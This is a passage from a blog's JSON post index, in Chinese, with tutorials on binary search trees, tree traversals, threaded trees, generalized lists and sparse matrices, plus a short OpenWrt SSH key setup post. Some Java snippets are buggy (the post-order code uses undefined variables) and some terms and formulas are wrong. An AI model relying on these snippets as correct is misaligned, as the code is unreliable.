:com.avaj.datastruct.tree.bst.TreeNode@4b67cf4d, value=12find the max value in mSearchTree = 17find the min value in mSearchTree = 1 我们分别用递归和迭代两种方式去查找 12，可以看到两次找到是同一个对象，这个对象的值为12；找到的最大值和最小值也是正确的；因此查找功能的实现是正确的。 二叉搜索树删除节点实现从二叉搜索树中，删除一个结点可以算是最复杂的操作了，主要是因为所要删除的结点，所处的位置被删除后，依然需要保持整棵树依然为二叉树，因此需要就不同的情况就像分析。 就拿我们上面创建的这颗二叉树来说，如果要删除的结点是1,7,11,17 这样的叶子结点，就很容易了；让其父结点指向为null即可；而如果是4,5 这样包含一颗子树的结点，换个角度来说，这其实就是单向链表，从单向链表中间位置删除一个结点也比较容易；最麻烦的就是如果要删除的结点是10,8,3,12 这类结点包含左右子树，我们就需要从左子树中找一个最大值，或者是右子树中的最小值来替代这个值。总结一下删除结点的操作： 叶子结点：直接删除，其父结点指向null 包含一个孩子的结点 ：父结点指向要删除结点的自结点（相当于链表中间删除一个元素）； 包含左右子树的结点：右子树最小值或左子树最大值替换此结点 结合以上分析，得出从二叉搜索树中删除结点的实现。 123456789101112131415161718192021222324252627282930313233343536/** * 从树中删除值为value 的特定结点 */public void delete(T value) &#123; if (value == null || isEmpty()) &#123; return; &#125; root = delete(root, value);&#125;private TreeNode&lt;T&gt; delete(TreeNode&lt;T&gt; node, T value) &#123; // 结点为空，要出删除的元素不在树中 if (node == null) &#123; return node; &#125; if (compare(node, value) &lt; 0) &#123; // 去左子树删除 node.leftChild = delete(node.getLeftChild(), value); &#125; else if (compare(node, value) &gt; 0) &#123; // 去右子树删除 node.rightChild = delete(node.getRightChild(), value); &#125; else &#123; // 要删除的就是当前结点 if (node.getLeftChild() != null &amp;&amp; node.getRightChild() != null) &#123;// 被删除的结点，包含左右子树 T temp = findMin(node.getRightChild()); // 得到右子树的最小值 node.setData(temp); //右子树最小值替换当前结点 node.rightChild = delete(node.getRightChild(), temp); // 从右子树删除这个最小值的结点 &#125; else &#123;// 被删除的结点，包含一个子树或没有子树 if (node.getLeftChild() != null) &#123; node = node.getLeftChild(); &#125; else &#123; node = node.getRightChild(); &#125; &#125; &#125; return node;&#125; 这里选择使用右子树的最小值替换，是因为删除这个最小值的结点会比较容易，因为他一定是不会是一个包含左右子树的结点。 计算二叉搜索树的高度最后，再来看看如何计算一颗二叉搜素树的度。 12345678910111213141516171819public int getTreeHeight() &#123; if (isEmpty()) &#123; return 0; &#125; return getTreeHeight(root);&#125;private int getTreeHeight(TreeNode&lt;T&gt; node) &#123; if (node == null) &#123; return 0; &#125; int leftHeight = getTreeHeight(node.getLeftChild()); int rightHeight = getTreeHeight(node.getRightChild()); int max = leftHeight &gt; rightHeight ? leftHeight : rightHeight; // 得到左右子树中较大的返回. return max + 1;&#125; Reference 二叉查找树(BST)的基本概念及常用操作 - https://blog.csdn.net/John_xyz/article/details/79622219 数据结构-二叉搜索树的实现 - https://www.jianshu.com/p/8baf54e53c26 二叉查找树 - https://www.cnblogs.com/gaochundong/p/binary_search_tree.html","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】线索二叉树（Threaded Binary Tree）","date":"2019-05-28T07:40:32.000Z","path":"2019/05/28/【Data-Structure】树-线索二叉树/","text":"线索二叉树（Threaded Binary Tree）通过观察二叉链表，我们发现，不管二叉树的形态如何，空链域的个数总是多于非空链域的个数。准确的说，有n个结点的二叉链表共有2n个链域，非空链域为n-1个，但其中的空链域却有n+1个。如下图所示。 这样，我们可以通过利用二叉链表中的空指针域，来存放指向结点在某种遍历次序下的前趋和后继结点的指针（这种附加的指针称为 “线索“ ），这种加上了线索的二叉链表称为线索链表（Threaded Linked List），相应的二叉树称为线索二叉树（Threaded Binary Tree）。 为什么要建立线索二叉树有了二叉树不就足够了吗？那为什么还要弄个线索二叉树出来呢？ 在原来的二叉链表中，如果想查找一个结点的左、右孩子节点非常容易。比如，在上图中，我们想查找节点B的左、右孩子节点（分别是节点D和节点E），我们只需要根据节点B中记录的两个链域，即可找到。 可是，如果要找该结点的前趋和后继结点呢？ 这就变得非常困难。所以，为了实现这个常见的需求，我们要在每个结点中增加两个指针域，来分别存放遍历时得到的前趋（successor）结点和后继（predecessor）结点，这样就可以通过该指针直接或间接访问到其前趋和后继结点。 根据线索性质的不同，线索二叉树可分为前序线索二叉树、中序线索二叉树和后序线索二叉树三种。比如，若对二叉树进行中序遍历，则所得的线索二叉树称为中序线索二叉树，线索链表称为为中序线索链表。 举例如图，以中序二叉树为例，我们可以把这颗二叉树中所有结点的空左指针域（lchild域），改为指向当前结点的前驱结点（灰色箭头表示），把空右指针域（rchild域），改为指向当前结点的后继结点（绿色箭头表示）。我们把指向前驱结点和后继结点的指针叫做线索 ，下图中这个加上线索的二叉树就称之为线索二叉树。 注意，对这个二叉树采用中序遍历时，访问节点的次序为：D B E A F C G。 线索二叉树结点结构如果只是在原二叉树的基础上利用空结点，那么就存在着这么一个问题：我们如何知道某一结点的lchild是指向他的左孩子还是指向前驱结点？rchild是指向右孩子还是后继结点？显然我们要对他的指向增设标志来加以区分。 因此，我们在每一个结点都增设两个标志域LTag和RTag，它们只存放0或1的布尔型变量，占用的空间很小。于是结点的结构如下图所示。 其中： LTag为0时，表示该一结点的lchild指向该结点的左孩子，为1时指向该结点的前驱结点； RTag为0时，表示该一结点的rchild指向该结点的右孩子，为1时指向该结点的后继结点。 因此实际的中序线索链表如下所示： 二叉树的线索化 对普通二叉树以某种次序遍历使其成为线索二叉树的过程就叫做线索化。因为前驱和后继结点只有在二叉树的遍历过程中才能得到，所以线索化的具体过程就是在二叉树的遍历中修改空指针。 增设头结点线索化后的二叉树，就如同操作一个双向链表。于是我们想到为二叉树增设一个头结点，这样就和双向链表一样，即能够从第一个结点正向开始遍历，也可以从最后一个结点逆向遍历。我们将其称之为双向线索链表。 这样定义的好处是既可以从第一个结点起顺后继进行遍历，也可以从最后一个结点起顺前驱进行遍历。 如上图，在线索二叉链表上添加一个head结点，并令其lchild域的指针指向二叉树的根结点(A)，其rchild域的指针指向中序遍历访问的最后一个结点(G)。同样地，二叉树中序序列的第一个结点中，lchild域指针指向头结点，中序序列的最后一个结点rchild域指针也指向头结点。 于是从头结点开始，我们既可以从第一个结点顺后继结点遍历，也可以从最后一个结点起顺前驱遍历。就和双链表一样。 Reference 数据结构和算法系列15 线索二叉树 - https://www.cnblogs.com/mcgrady/p/3320413.html 线索二叉树 - https://www.cnblogs.com/zhuyf87/archive/2012/11/03/2752722.html 理解线索二叉树 - https://www.jianshu.com/p/deb1d2f2549a","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】二叉树的遍历（Traversal）","date":"2019-05-27T12:55:13.000Z","path":"2019/05/27/【Data-Structure】树-二叉树的遍历/","text":"二叉树节点类树节点1234567891011class TreeNode &#123; int val; //左子树 TreeNode left; //右子树 TreeNode right; //构造方法 TreeNode(int x) &#123; val = x; &#125;&#125; 二叉树遍历（Traversal）树的遍历是树的一种重要的运算。所谓遍历是指对树中所有结点的信息的访问，即依次对树中每个结点访问一次且仅访问一次，我们把这种对所有节点的访问称为遍历（traversal）。 那么树的两种重要的遍历模式是深度优先遍历（Depth-first Search，DFS）和广度优先遍历（Breadth-first Search，BFS） ，深度优先一般用递归，广度优先一般用队列。一般情况下能用递归实现的算法大部分也能用堆栈来实现。 深度优先遍历（Depth-first Search，DFS）对于一颗二叉树，深度优先搜索（Depth-first Search，DFS）是沿着树的深度遍历树的节点，尽可能深的搜索树的分支。 那么深度遍历有重要的三种方法。这三种方式常被用于访问树的节点，它们之间的不同在于访问每个节点的次序不同。这三种遍历分别叫做先序遍历（Pre-order Traversal），中序遍历（In-order Traversal）和后序遍历（Post-order Traversal）。 二叉树先序遍历（Pre-order Traversal）二叉树先序遍历的实现思想是： 访问根节点； 访问当前节点的左子树； 若当前节点无左子树，则访问当前节点的右子树； 例子 以上图为例，采用先序遍历的思想遍历该二叉树的过程为： 访问该二叉树的根节点，找到 1； 访问节点 1 的左子树，找到节点 2； 访问节点 2 的左子树，找到节点 4； 由于访问节点 4 左子树失败，且也没有右子树，因此以节点 4 为根节点的子树遍历完成。但节点 2 还没有遍历其右子树，因此现在开始遍历，即访问节点 5； 由于节点 5 无左右子树，因此节点 5 遍历完成，并且由此以节点 2 为根节点的子树也遍历完成。现在回到节点 1 ，并开始遍历该节点的右子树，即访问节点 3； 访问节点 3 左子树，找到节点 6； 由于节点 6 无左右子树，因此节点 6 遍历完成，回到节点 3 并遍历其右子树，找到节点 7； 节点 7 无左右子树，因此以节点 3 为根节点的子树遍历完成，同时回归节点 1。由于节点 1 的左右子树全部遍历完成，因此整个二叉树遍历完成； 因此，上图中二叉树采用先序遍历得到的序列为： 11 2 4 5 3 6 7 实现递归（Recursive）实现1234567public void preOrderTraverse1(TreeNode root) &#123; if (root != null) &#123; System.out.print(root.val+\" \"); preOrderTraverse1(root.left); preOrderTraverse1(root.right); &#125;&#125; 非递归（Iterative）实现根据前序遍历的顺序，优先访问根结点，然后再访问左子树和右子树。 所以，对于任意结点node，如果不为null，先直接访问它；之后再判断左子树是否为空： 不为空时，重复上面的步骤，直到其为空； 若为空，则需要访问右子树。 1234567891011121314public void preOrderTraverse2(TreeNode root) &#123; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); TreeNode pNode = root; while (pNode != null || !stack.isEmpty())&#123; if(pNode != null)&#123; System.out.print(pNode.val+\" \"); pNode = pNode.left; stack.push(pNode); &#125;else&#123; //!stack.isEmpty() &amp;&amp; pNode == null TreeNode node = stack.pop(); pNode = node.right; &#125; &#125;&#125; 另一种等价的实现（不同的表达方式）： 123456789101112131415161718public static void preOrderTraversal(TreeNode node) &#123; if (node == null) return; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); while (!stack.isEmpty() || node != null) &#123; if (node != null) &#123; System.out.println(node.val); node = node.left; if (node.right != null) &#123; stack.push(node.right); &#125; &#125; else &#123; node = stack.pop(); &#125; &#125;&#125; 二叉树中序遍历（In-order Traversal）二叉树中序遍历的实现思想是： 访问当前节点的左子树； 访问根节点； 访问当前节点的右子树； 例子 以上图为例，采用中序遍历的思想遍历该二叉树的过程为： 访问该二叉树的根节点，找到 1； 遍历节点 1 的左子树，找到节点 2； 遍历节点 2 的左子树，找到节点 4； 由于节点 4 无左孩子，因此找到节点 4，并遍历节点 4 的右子树； 由于节点 4 无右子树，因此节点 2 的左子树遍历完成，访问节点 2； 遍历节点 2 的右子树，找到节点 5； 由于节点 5 无左子树，因此访问节点 5 ，又因为节点 5 没有右子树，因此节点 1 的左子树遍历完成，访问节点 1 ，并遍历节点 1 的右子树，找到节点 3； 遍历节点 3 的左子树，找到节点 6； 由于节点 6 无左子树，因此访问节点 6，又因为该节点无右子树，因此节点 3 的左子树遍历完成，开始访问节点 3 ，并遍历节点 3 的右子树，找到节点 7； 由于节点 7 无左子树，因此访问节点 7，又因为该节点无右子树，因此节点 1 的右子树遍历完成，即整棵树遍历完成； 因此，图 1 中二叉树采用中序遍历得到的序列为： 14 2 5 1 6 3 7 实现递归（Recursive）实现1234567public void inOrderTraverse1(TreeNode root) &#123; if (root != null) &#123; inOrderTraverse1(root.left); System.out.print(root.val+\" \"); inOrderTraverse1(root.right); &#125;&#125; 非递归（Iterative）实现12345678910111213141516public void inOrderTraverse(TreeNode root) &#123; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); TreeNode pNode = root; while (pNode != null || !stack.isEmpty())&#123; if(pNode != null)&#123; stack.push(pNode); pNode = pNode.left; &#125;else&#123; //!stack.isEmpty() &amp;&amp; pNode == null TreeNode node = stack.pop(); System.out.print(node.val+\" \"); pNode = node.right; &#125; &#125;&#125; 二叉树后序遍历（Post-order Traversal）二叉树后序遍历的实现思想是：从根节点出发，依次遍历各节点的左右子树，直到当前节点左右子树遍历完成后，才访问该节点元素。 例子 如上图中，对此二叉树进行后序遍历的操作过程为： 从根节点 1 开始，遍历该节点的左子树（以节点 2 为根节点）； 遍历节点 2 的左子树（以节点 4 为根节点）； 由于节点 4 既没有左子树，也没有右子树，此时访问该节点中的元素 4，并回退到节点 2 ，遍历节点 2 的右子树（以 5 为根节点）； 由于节点 5 无左右子树，因此可以访问节点 5 ，并且此时节点 2 的左右子树也遍历完成，因此也可以访问节点 2； 此时回退到节点 1 ，开始遍历节点 1 的右子树（以节点 3 为根节点）； 遍历节点 3 的左子树（以节点 6 为根节点）； 由于节点 6 无左右子树，因此访问节点 6，并回退到节点 3，开始遍历节点 3 的右子树（以节点 7 为根节点）； 由于节点 7 无左右子树，因此访问节点 7，并且节点 3 的左右子树也遍历完成，可以访问节点 3；节点 1 的左右子树也遍历完成，可以访问节点 1； 到此，整棵树的遍历结束。 由此，对图 1 中二叉树进行后序遍历的结果为： 14 5 2 6 7 3 1 实现递归（Recursive）实现1234567public void postOrderTraverse1(TreeNode root) &#123; if (root != null) &#123; postOrderTraverse1(root.left); postOrderTraverse1(root.right); System.out.print(root.val+\" \"); &#125;&#125; 非递归（Iterative）实现1234567891011121314151617181920212223242526public void postOrderTraverse2(TreeNode root) &#123; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); TreeNode pNode = root; while (true)&#123; while(pNode != null)&#123; stack.push(pNode); if(pNode.right != null) stack.push(pNode.right); pNode = pNode.left; &#125; if(stack.isEmpty()) return; pNode = stack.pop(); if( pNode.right != null &amp;&amp; ! stack.isEmpty() &amp;&amp; current.right == stack.peek() ) &#123; stack.pop(); stack.push(pNode); pNode = pNode.right; &#125; else &#123; System.out.print( pNode.data + \" \" ); pNode = null; &#125; &#125; &#125; ##### 广度优先遍历（Breadth-first Search，BFS）二叉树层次遍历（Level-order Traversal）前边介绍了二叉树的先序、中序和后序的遍历算法，运用了栈的数据结构，主要思想就是按照先左子树后右子树的顺序依次遍历树中各个结点。 本节介绍另外一种遍历方式：按照二叉树中的层次从左到右依次遍历每层中的结点。 具体的实现思路是：通过使用队列的数据结构，从树的根结点开始，依次将其左孩子和右孩子入队。而后每次队列中一个结点出队，都将其左孩子和右孩子入队，直到树中所有结点都出队，出队结点的先后顺序就是层次遍历的最终结果。 例子 层次遍历上图中的二叉树： 首先，根结点 1 入队； 根结点 1 出队，出队的同时，将左孩子 2 和右孩子 3 分别入队； 队头结点 2 出队，出队的同时，将结点 2 的左孩子 4 和右孩子 5 依次入队； 队头结点 3 出队，出队的同时，将结点 3 的左孩子 6 和右孩子 7 依次入队； 不断地循环，直至队列内为空。 实现非递归（Iterative）实现12345678910111213public static void levelOrderTraversal(TreeNode startNode) &#123; Queue&lt;TreeNode&gt; queue=new LinkedList&lt;TreeNode&gt;(); queue.add(startNode); while(!queue.isEmpty()) &#123; TreeNode tempNode=queue.poll(); System.out.printf(\"%d \",tempNode.data); if(tempNode.left!=null) queue.add(tempNode.left); if(tempNode.right!=null) queue.add(tempNode.right); &#125;&#125; Reference 二叉树的深度优先和广度优先遍历 - https://www.jianshu.com/p/473090b9490d","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】二叉树（Binary Tree）","date":"2019-05-27T07:54:04.000Z","path":"2019/05/27/【Data-Structure】树-二叉树/","text":"二叉树（Binary Tree）简单地理解，满足以下两个条件的树就是二叉树： 本身是有序树； 树中包含的各个节点的度不能超过 2，即只能是 0、1 或者 2； 二叉树的性质经过前人的总结，二叉树具有以下几个性质： 二叉树中，第 i 层最多有 2i-1 个结点。 如果二叉树的深度为 K，那么此二叉树最多有 2K-1 个结点。 二叉树中，终端结点数（叶子结点数）为 n0，度为 2 的结点数为 n2，则 n0=n2+1。 性质 3 的计算方法为：对于一个二叉树来说，除了度为 0 的叶子结点和度为 2 的结点，剩下的就是度为 1 的结点（设为 n1），那么总结点 n=n0+n1+n2。同时，对于每一个结点来说都是由其父结点分支表示的，假设树中分枝数为 B，那么总结点数 n=B+1。而分枝数是可以通过 n1 和 n2 表示的，即 B=n1+2*n2。所以，n 用另外一种方式表示为 n=n1+2*n2+1。两种方式得到的 n 值组成一个方程组，就可以得出 n0=n2+1。 二叉树还可以继续分类，衍生出满二叉树和完全二叉树。 满二叉树如果二叉树中除了叶子结点，每个结点的度都为 2，则此二叉树称为满二叉树。 如上图所示就是一棵满二叉树。 满二叉树除了满足普通二叉树的性质，还具有以下性质： 满二叉树中第 i 层的节点数为 2n-1 个。 深度为 k 的满二叉树必有 2k-1 个节点 ，叶子数为 2k-1。 满二叉树中不存在度为 1 的节点，每一个分支点中都两棵深度相同的子树，且叶子节点都在最底层。 具有 n 个节点的满二叉树的深度为 $log_2(n+1)$。 完全二叉树如果二叉树中除去最后一层节点为满二叉树，且最后一层的结点依次从左到右分布，则此二叉树被称为完全二叉树。 如上图所示是一棵完全二叉树，图 b) 由于最后一层的节点没有按照从左向右分布，因此只能算作是普通的二叉树。 完全二叉树除了具有普通二叉树的性质，它自身也具有一些独特的性质，比如说，n 个结点的完全二叉树的深度为 ⌊$log_2n$⌋+1。 ⌊$log_2n$⌋ 表示取小于 $log_2n$ 的最大整数。例如，⌊$log_24$⌋ = 2，而 ⌊$log_25$⌋ 结果也是 2。 对于任意一个完全二叉树来说，如果将含有的结点按照层次从左到右依次标号（如上图a)），对于任意一个结点 i ，完全二叉树还有以下几个结论成立： 当 i&gt;1 时，父亲结点为结点 [i/2] 。（i=1 时，表示的是根结点，无父亲结点） 如果 2i&gt;n（总结点的个数） ，则结点 i 肯定没有左孩子（为叶子结点）；否则其左孩子是结点 2i 。 如果 2i+1&gt;n ，则结点 i 肯定没有右孩子；否则右孩子是结点 2i+1 。 二叉树的存储结构二叉树的存储结构有两种，分别为顺序存储和链式存储。 二叉树的顺序存储结构二叉树的顺序存储，指的是使用顺序表（数组）存储二叉树。需要注意的是，顺序存储只适用于完全二叉树。换句话说，只有完全二叉树才可以使用顺序表存储。因此，如果我们想顺序存储普通二叉树，需要提前将普通二叉树转化为完全二叉树。 有读者会说，满二叉树也可以使用顺序存储。要知道，满二叉树也是完全二叉树，因为它满足完全二叉树的所有特征。 普通二叉树转完全二叉树的方法很简单，只需给二叉树额外添加一些节点，将其”拼凑”成完全二叉树即可。如下图所示： 上图中，左侧是普通二叉树，右侧是转化后的完全（满）二叉树。 完全二叉树的顺序存储，仅需从根节点开始，按照层次依次将树中节点存储到数组即可。 例如，存储上图所示的完全二叉树，其存储状态如下图所示： 同样，存储由普通二叉树转化来的完全二叉树也是如此。例如，上图中普通二叉树的数组存储状态如下图所示： 由此，我们就实现了完全二叉树的顺序存储。 不仅如此，从顺序表中还原完全二叉树也很简单。我们知道，完全二叉树具有这样的性质，将树中节点按照层次并从左到右依次标号（1,2,3,…），若节点 i 有左右孩子，则其左孩子节点为 2*i，右孩子节点为 2*i+1。此性质可用于还原数组中存储的完全二叉树。 二叉树的链式存储结构其实二叉树并不适合用数组存储，因为并不是每个二叉树都是完全二叉树，普通二叉树使用顺序表存储或多或多会存在空间浪费的现象。 如上图所示，此为一棵普通的二叉树，若将其采用链式存储，则只需从树的根节点开始，将各个节点及其左右孩子使用链表存储即可。因此，上图对应的链式存储结构如下图所示： 由上图可知，采用链式存储二叉树时，其节点结构由 3 部分构成（如下图所示）： 指向左孩子节点的指针（Lchild）； 节点存储的数据（data）； 指向右孩子节点的指针（Rchild）； 三叉链表其实，二叉树的链式存储结构远不止上图所示的这一种。例如，在某些实际场景中，可能会做 “查找某节点的父节点” 的操作，这时可以在节点结构中再添加一个指针域，用于各个节点指向其父亲节点，如下图所示： 这样的链表结构，通常称为三叉链表。 Reference 数据结构概述 - http://data.biancheng.net/intro/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Network】OpenWrt的路由器ssh访问","date":"2019-05-27T03:28:03.000Z","path":"2019/05/27/【Network】Openwrt的路由器ssh访问/","text":"上下文在成功刷完OpenWrt固件到路由器后，可以直接通过Luci界面来配置root用户的密码（同时，这个密码也是OpenWrt路由器管理页面的账号密码，如下图）。 为了方便我们通过SSH访问并管理路由器，我们可以通过Luci界面的 System - Administration 下的 SSH Access。 Dropbear是一款基于ssh协议的轻量sshd服务器，与OpenSSH相比，他更简洁，更小巧，运行起来占用的内存也更少。我们可以把它理解为嵌入式的Linux系统下的sshd服务器软件，比如路由器。 配置Dropbear Instance通过配置一个 Dropbear Instance，我们就可以使用一个Linux系统账号（比如root），通过ssh来访问我们的OpenWrt Linux系统，以进行管理。 SSH-Keys进一步地，通过配置SSH-Keys，就可以让我们无需输入root账号密码而直接通过ssh连接OpenWrt Linux系统。 比如，我们通过使用一台MacBook 来管理这个OpenWrt Linux系统。这个操作的本质，就是将我们的MacBook的ssh 公钥（如果已经生成，通常位于~/.ssh/id_rsa.pub文件中）添加到OpenWrt Linux系统的ssh 公钥认证列表中。 此后，我们无需输入root账号密码而直接通过ssh连接OpenWrt Linux系统，如下图：","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Data Structure】广义表","date":"2019-05-24T04:52:25.000Z","path":"2019/05/24/【Data-Structure】广义表/","text":"数组既可以存储不可再分的数据元素（如数字 5、字符 ‘a’），也可以继续存储数组（即 n 维数组）。 但需要注意的是，以上两种数据存储形式绝不会出现在同一个数组中。例如，我们可以创建一个整形数组去存储 {1,2,3}，我们也可以创建一个二维整形数组去存储 ，但数组不适合用来存储类似 这样的数据。 有人可能会说，创建一个二维s数组来存储。在存储上确实可以实现，但无疑会造成存储空间的浪费。 对于存储 这样的数据，更适合用广义表结构来存储。 什么是广义表广义表，又称列表，也是一种线性存储结构。 同数组类似，广义表中既可以存储不可再分的元素，也可以存储广义表，记作： 1LS = (a1,a2,…,an) 其中，LS 代表广义表的名称，an 表示广义表存储的数据。广义表中每个 ai 既可以代表单个元素，也可以代表另一个广义表。 原子和子表通常，广义表中存储的单个元素称为 “原子“，而存储的广义表称为 “子表“。 例如创建一个广义表 LS = ，我们可以这样解释此广义表的构成：广义表 LS 存储了一个原子 1 和子表 {1,2,3}。 以下是广义表存储数据的一些常用形式： A = ()：A 表示一个广义表，只不过表是空的。 B = (e)：广义表 B 中只有一个原子 e。 C = (a,(b,c,d)) ：广义表 C 中有两个元素，原子 a 和子表 (b,c,d)。 D = (A,B,C)：广义表 D 中存有 3 个子表，分别是A、B和C。这种表示方式等同于 D = ((),(e),(b,c,d)) 。 E = (a,E)：广义表 E 中有两个元素，原子 a 和它本身。这是一个递归广义表，等同于：E = (a,(a,(a,…)))。 注意，A = () 和 A = (()) 是不一样的。前者是空表，而后者是包含一个子表的广义表，只不过这个子表是空表。 广义表的表头和表尾当广义表不是空表时，称第一个数据（原子或子表）为”表头“，剩下的数据构成的新广义表为”表尾“。 强调一下，除非广义表为空表，否则广义表一定具有表头和表尾，且广义表的表尾一定是一个广义表。 例如在广义表中 LS= 中，表头为原子 1，表尾为子表 {1,2,3} 和原子 5 构成的广义表，即 。 再比如，在广义表 LS = {1} 中，表头为原子 1 ，但由于广义表中无表尾元素，因此该表的表尾是一个空表，用 {} 表示。 广义表的存储结构使用链表存储广义表由于广义表中既可存储原子（不可再分的数据元素），也可以存储子表，因此很难使用顺序存储结构表示，通常情况下广义表结构采用链表实现。 使用顺序表实现广义表结构，不仅需要操作 n 维数组（例如就需要使用三维数组存储），还会造成存储空间的浪费。 使用链表存储广义表，首先需要确定链表中节点的结构。由于广义表中可同时存储原子和子表两种形式的数据，因此链表节点的结构也有两种，如下图所示： 如上图所示，表示原子的节点由两部分构成，分别是 tag 标记位和原子的值，表示子表的节点由三部分构成，分别是 tag 标记位、hp 指针和 tp 指针。 tag 标记位用于区分此节点是原子还是子表，通常原子的 tag 值为 0，子表的 tag 值为 1。子表节点中的 hp 指针用于连接本子表中存储的原子或子表，tp 指针用于连接广义表中下一个原子或子表。 因此，广义表中两种节点的 C 语言表示代码为： 123456789typedef struct GLNode&#123; int tag;//标志域 union&#123; char atom;//原子结点的值域 struct&#123; struct GLNode * hp,tp; &#125;ptr;//子表结点的指针域，hp指向表头；tp指向表尾 &#125;;&#125;Glist; 这里用到了 union 共用体，因为同一时间此节点不是原子节点就是子表节点，当表示原子节点时，就使用 atom 变量；反之则使用 ptr 结构体。 例如，广义表 是由一个原子 a 和子表 {b,c,d} 构成，而子表 {b,c,d} 又是由原子 b、c 和 d 构成，用链表存储该广义表如下图所示： 上图可以看到，存储原子 a、b、c、d 时都是用子表包裹着表示的，因为原子 a 和子表 {b,c,d} 在广义表中同属一级，而原子 b、c、d 也同属一级。 Reference 数据结构概述 - http://data.biancheng.net/intro/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】矩阵","date":"2019-05-24T03:47:25.000Z","path":"2019/05/24/【Data-Structure】矩阵/","text":"矩阵数据结构中，提供针对某些特殊矩阵的压缩存储结构。 这里所说的特殊矩阵，主要分为以下两类： 含有大量相同数据元素的矩阵，比如对称矩阵； 含有大量 0 元素的矩阵，比如稀疏矩阵、上（下）三角矩阵； 针对以上两类矩阵，数据结构的压缩存储思想是：矩阵中的相同数据元素（包括元素 0）只存储一个。 对称矩阵 上图的矩阵中，数据元素沿主对角线对应相等，这类矩阵称为对称矩阵。 矩阵中有两条对角线，其中图 1 中的对角线称为主对角线，另一条从左下角到右上角的对角线为副对角线。对称矩阵指的是各数据元素沿主对角线对称的矩阵。 结合数据结构压缩存储的思想，我们可以使用一维数组存储对称矩阵。由于矩阵中沿对角线两侧的数据相等，因此数组中只需存储对角线一侧（包含对角线）的数据即可。 对称矩阵的实现过程是，若存储下三角中的元素，只需将各元素所在的行标 i 和列标 j （矩阵中元素的行标和列标都从 1 开始）代入下面的公式： 存储上三角的元素要将各元素的行标 i 和列标 j 代入另一个公式： 最终求得的 k 值即为该元素存储到数组中的位置。 例如，在数组 skr[6] 中存储上图中的对称矩阵，则矩阵的压缩存储状态如下图所示（存储上三角和下三角的结果相同）： 上（下）三角矩阵 如上图所示，主对角线下的数据元素全部相同的矩阵为上三角矩阵（上图 a)），主对角线上元素全部相同的矩阵为下三角矩阵（上图 b)）。 对于这类特殊的矩阵，压缩存储的方式是：上（下）三角矩阵采用对称矩阵的方式存储上（下）三角的数据（元素 0 不用存储）。 稀疏矩阵 如上图所示，如果矩阵中分布有大量的元素 0，即非 0 元素非常少，这类矩阵称为稀疏矩阵。 压缩存储稀疏矩阵的方法是：只存储矩阵中的非 0 元素，与前面的存储方法不同，稀疏矩阵非 0 元素的存储需同时存储该元素所在矩阵中的行标和列标。 例如，存储上图中的稀疏矩阵，需存储以下信息： (1,1,1)：数据元素为 1，在矩阵中的位置为 (1,1)； (3,3,1)：数据元素为 3，在矩阵中的位置为 (3,1)； (5,2,3)：数据元素为 5，在矩阵中的位置为 (2,3)； 除此之外，还要存储矩阵的行数 3 和列数 3； 由此，可以成功存储一个稀疏矩阵。 注意，以上 3 种特殊矩阵的压缩存储，除了将数据元素存储起来，还要存储矩阵的行数值和列数值。 矩阵压缩存储的 3 种方式对于以上 3 种特殊的矩阵，对阵矩阵和上下三角矩阵的实现方法是相同的，且实现过程比较容易，仅需套用上面给出的公式即可。 稀疏矩阵的压缩存储，数据结构提供有 3 种具体实现方式： 三元组顺序表； 行逻辑链接的顺序表； 十字链表； 三元组顺序表稀疏矩阵的压缩存储，至少需要存储以下信息： 矩阵中各非 0 元素的值，以及所在矩阵中的行标和列标； 矩阵的总行数和总列数； 例如，上图是一个稀疏矩阵，若对其进行压缩存储，矩阵中各非 0 元素的存储状态如下图所示： 上图的数组中，存储的是三元组（即由 3 部分数据组成的集合），组中数据分别表示（行标，列标，元素值）。 注意，这里矩阵的行标和列标都从 1 开始。 行逻辑链接的顺序表十字链表矩阵（稀疏矩阵）的转置算法Reference 数据结构概述 - http://data.biancheng.net/intro/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】树（Tree）","date":"2019-05-24T02:26:42.000Z","path":"2019/05/24/【Data-Structure】树-树/","text":"树（Tree） 上图(A) 是使用树结构存储的集合 {A,B,C,D,E,F,G,H,I,J,K,L,M} 的示意图。对于数据 A 来说，和数据 B、C、D 有关系；对于数据 B 来说，和 E、F 有关系。这就是“一对多”的关系。 将具有“一对多”关系的集合中的数据元素按照上图（A）的形式进行存储，整个存储形状在逻辑结构上看，类似于实际生活中倒着的树（上图（B）倒过来），所以称这种存储结构为“树型”存储结构。 树（Tree）是由多个节点（Node）的集合组成，每个节点又有多个与其关联的子节点（Child Node）。子节点就是直接处于节点之下的节点，而父节点（Parent Node）则位于节点直接关联的上方。树的根（Root）指的是一个没有父节点的单独的节点。 所有的树都呈现了一些共有的性质： 只有一个根节点； 